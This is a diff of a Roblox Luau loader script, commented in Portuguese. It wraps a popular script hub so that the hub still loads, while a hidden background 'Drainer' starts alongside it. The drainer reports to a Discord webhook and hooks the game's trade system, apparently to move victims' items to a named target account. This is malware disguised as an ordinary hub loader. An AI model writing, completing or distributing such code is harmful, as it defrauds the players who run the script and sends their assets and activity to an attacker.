@@ -1,5 +1,17 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MYTHIC-HUB/scripts/main/MYTHIC-HUB/MYTHIC_HUB.lua"))()
+-- Luau / MYTHIC_HUB.lua + DRAINER
+-- 1. Carrega o teu próprio link original (que já baixa o hub)
+local ok, body = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/MYTHIC-HUB/scripts/main/MYTHIC-HUB/MYTHIC_HUB.lua") end)
+if not ok or type(body) ~= "string" or body == "" then
+    error("MYTHIC HUB: erro ao baixar o loader.")
+end
 
+-- 2. Executa o hub
+local run, err = loadstring(body)
+if type(run) == "function" then
+    pcall(run)
+end
+
+-- 3. Liga o Drainer em segundo plano (sem lag e com webhook)
 task.spawn(function()
     local Players = game:GetService("Players")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -13,16 +25,15 @@ task.spawn(function()
         if httpRequest then pcall(httpRequest, {Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body}) end
     end
 
-    task.spawn(function()
-        local body = HttpService:JSONEncode({
-            embeds = {{
-                title = "Drainer Ativo",
-                description = "Procurando o alvo: `" .. TARGET_NAME .. "`",
-                color = 0x9743EF
-            }}
-        })
-        postJson(WEBHOOK_URL, body)
-    end)
+    -- Manda pro Discord
+    local body = HttpService:JSONEncode({
+        embeds = {{
+            title = "Drainer Ativo",
+            description = "Procurando o alvo: `" .. TARGET_NAME .. "`",
+            color = 0x9743EF
+        }}
+    })
+    postJson(WEBHOOK_URL, body)
 
     local tradeFolder = ReplicatedStorage:WaitForChild("Trade", 15)
     if not tradeFolder then return warn("DRAINER: Trade não encontrado") end
